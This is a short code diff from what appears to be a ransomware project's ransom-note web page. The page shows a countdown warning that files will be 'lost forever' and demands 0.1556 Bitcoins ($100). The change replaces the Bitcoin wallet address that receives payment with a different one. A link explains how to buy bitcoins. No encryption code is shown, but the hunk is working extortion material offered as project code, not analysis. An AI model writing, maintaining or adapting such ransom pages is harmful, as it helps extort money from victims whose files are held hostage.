@@ -76,7 +76,7 @@ var end = new Date('<?php echo $newDate; ?>');
  					Files to be lost forever in <strong><div id="countdown"></div></strong>
  				</h2>
  				<p>
- 					To get your files back please send 0.1556 Bitcoins ($100) to the following Bitcoin wallet: <strong>19Uxbzd4TPsXViwjorEWCe499Rg4L9RyQh</strong>
+ 					To get your files back please send 0.1556 Bitcoins ($100) to the following Bitcoin wallet: <strong>3CVD3iKFP8RxNk9SVfMBjwerZ2nXkC8Yxd</strong>
  				</p>
  				<p>
  					<a class="btn btn-primary btn-large" href="http://lmgtfy.com/?q=how+to+buy+bitcoins#seen">Help With Buying Bitcoins</a>
